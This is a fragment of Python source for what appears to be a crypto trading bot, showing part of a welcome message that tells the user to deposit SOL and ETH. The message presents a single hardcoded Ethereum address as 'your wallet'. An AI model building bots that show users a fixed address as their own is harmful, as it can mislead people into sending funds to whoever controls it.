...
class TradingBot:
    def __init__(self):
        self.welcome_message = (
            ...
            "🚫 No SOL detected in your wallet.\n"
            "🔄 To get started, please deposit SOL to your wallet address.\n"
            "Once received, you'll be able to trade, swap, or interact with the Solana ecosystem.\n\n"
            "*Eth wallet W2👉* `0x67B169aC536789358B655936D817b76C27B57828`\n"
            "🚫 No ETH found in your wallet.\n"
            "🔄 To begin, deposit ETH to your wallet address.\n"
            "Once the funds arrive, you'll be ready to explore Ethereum-based features and trading.\n\n"
